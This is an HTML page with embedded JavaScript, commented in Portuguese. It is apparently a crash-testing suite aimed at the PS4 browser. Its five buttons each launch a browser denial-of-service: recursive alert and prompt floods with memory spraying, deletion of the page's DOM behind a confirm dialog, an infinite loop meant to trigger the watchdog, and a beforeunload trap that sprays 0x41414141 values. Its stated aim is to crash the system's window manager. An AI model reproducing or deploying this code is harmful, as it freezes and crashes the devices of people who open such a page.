<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v470000: The Modal Storm</title>
<style>
    body { background: #000; color: #ff0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #ff0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #550; color: #fff; font-weight: bold;
    }
    .inst { font-size: 0.9em; color: #fff; margin-bottom: 15px; }
    
    button {
        display: block; width: 100%; padding: 20px; margin: 10px 0;
        background: #330; color: #fff; border: 2px solid #ff0;
        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #ff0; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v470000: THE MODAL STORM</h1>

<div class="status" id="msg">
    ESTRATÉGIA: FULLSCREEN + MENSAGENS DE SISTEMA<br>
    OBJETIVO: TRAVAR O GERENCIADOR DE JANELAS
</div>

<div class="inst">
    INSTRUÇÃO GERAL:<br>
    1. Clique no Botão.<br>
    2. Espere o Fullscreen.<br>
    3. Quando a mensagem aparecer: Tente FECHAR ou DAR REFRESH rápido.
</div>

<button onclick="storm(m01)">01. The Alert Hell (Stack Overflow)</button>

<button onclick="storm(m02)">02. Confirm spam + DOM Nuke</button>

<button onclick="storm(m03)">03. Prompt Allocator (Memory Leak)</button>

<button onclick="storm(m04)">04. Watchdog Trigger (Freeze)</button>

<button onclick="storm(m05)">05. Exit Trap (BeforeUnload Crash)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Armazém de lixo para memória
    let junk = [];

    function storm(vectorFunc) {
        Stage.innerHTML = "";
        junk = [];
        
        // 1. Configura
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Execução (Delay para garantir Fullscreen ativo)
        requestAnimationFrame(() => {
            setTimeout(() => {
                if(target._trigger) target._trigger();
            }, 500);
        });
    }

    // =================================================================
    // 01. The Alert Hell
    // Abre alertas recursivamente.
    // O PS4 desenha uma caixa cinza nativa. Se abrirmos milhares,
    // a pilha de UI do sistema estoura.
    // =================================================================
    function m01(stage) {
        const d = document.createElement('div');
        d.innerText = "ALERT LOOP";
        stage.appendChild(d);

        d._trigger = () => {
            function loop() {
                // Aloca memória antes de cada alerta
                junk.push(new Uint8Array(1024*100)); 
                
                // Abre o alerta. O script PAUSA aqui até você clicar OK.
                window.alert("⚠️ SYSTEM ERROR " + junk.length + " ⚠️\n\nTente fechar esta aba agora!");
                
                // Assim que você clica OK, ele chama o próximo imediatamente
                // Se você tentar dar Refresh enquanto a caixa está aberta -> Crash
                requestAnimationFrame(loop);
            }
            loop();
        };
        return d;
    }

    // =================================================================
    // 02. Confirm spam + DOM Nuke
    // Usa 'confirm()' que tem dois botões (Sim/Não).
    // Enquanto a caixa está aberta, destruímos o DOM no fundo.
    // =================================================================
    function m02(stage) {
        const d = document.createElement('div');
        d.innerText = "CONFIRM NUKE";
        stage.appendChild(d);

        d._trigger = () => {
            // Agenda a destruição para daqui a pouco
            setTimeout(() => {
                document.body.innerHTML = ""; // Destroi tudo
                junk.push(new Float64Array(10000).fill(1.1)); // Spray
            }, 100);

            // Abre a caixa de confirmação imediatamente
            // O usuário vê a caixa, mas o site atrás já morreu (ou está morrendo)
            const result = window.confirm("O site foi destruído.\nO sistema ainda está de pé?");
            
            // Recursão se o usuário sobreviver
            if(result || !result) window.location.reload();
        };
        return d;
    }

    // =================================================================
    // 03. Prompt Allocator
    // A caixa 'prompt' permite digitar texto. Isso aloca memória de String no Kernel.
    // Vamos abusar disso.
    // =================================================================
    function m03(stage) {
        const d = document.createElement('div');
        d.innerText = "PROMPT FLOOD";
        stage.appendChild(d);

        d._trigger = () => {
            let i = 0;
            function run() {
                i++;
                // String gigante na mensagem do prompt
                const payload = "A".repeat(2000); 
                
                // Abre o prompt. 
                // TENTE: Apertar o botão 'Home/PS' enquanto essa caixa está na tela.
                window.prompt("Alocação #" + i + "\n" + payload, "Digite algo aqui...");
                
                requestAnimationFrame(run);
            }
            run();
        };
        return d;
    }

    // =================================================================
    // 04. Watchdog Trigger (Freeze)
    // Este é o clássico que você já viu, mas focado em forçar a mensagem
    // "Página não respondendo".
    // INSTRUÇÃO: Quando a mensagem aparecer, clique em "AGUARDAR" (Wait).
    // =================================================================
    function m04(stage) {
        const d = document.createElement('div');
        d.innerText = "WATCHDOG TRAP";
        stage.appendChild(d);

        d._trigger = () => {
            // Loop síncrono infinito
            // Isso congela a UI e força o sistema a mostrar o aviso de erro
            const start = Date.now();
            while(true) {
                // Faz cálculo inútil para esquentar a CPU
                Math.random();
                
                // A cada 5 segundos, tenta alocar memória (se o loop permitir)
                if(Date.now() - start > 5000) {
                     // Isso nunca vai rodar se o watchdog pegar antes,
                     // mas se você clicar em "Aguardar", pode rodar.
                     junk.push(new Uint8Array(1024));
                }
            }
        };
        return d;
    }

    // =================================================================
    // 05. Exit Trap (BeforeUnload Crash)
    // Tenta travar o navegador quando ele tenta fechar.
    // Mostra a caixa "Tem certeza que deseja sair?".
    // =================================================================
    function m05(stage) {
        const d = document.createElement('div');
        d.innerText = "EXIT TRAP";
        stage.appendChild(d);

        d._trigger = () => {
            // Define o evento de saída
            window.onbeforeunload = function(e) {
                // Tenta iniciar um loop de corrupção ENQUANTO a caixa de confirmação está na tela
                
                // Spray de memória no fundo
                setInterval(() => {
                    junk.push(new Uint32Array(1000).fill(0x41414141));
                }, 1);

                // A mensagem que força a caixa nativa do sistema
                const msg = "SISTEMA COMPROMETIDO?";
                e.returnValue = msg;
                return msg;
            };

            // Tenta forçar o reload automaticamente para disparar a armadilha
            setTimeout(() => {
                window.location.href = "about:blank";
            }, 1000);
        };
        return d;
    }

</script>
</body>
</html>
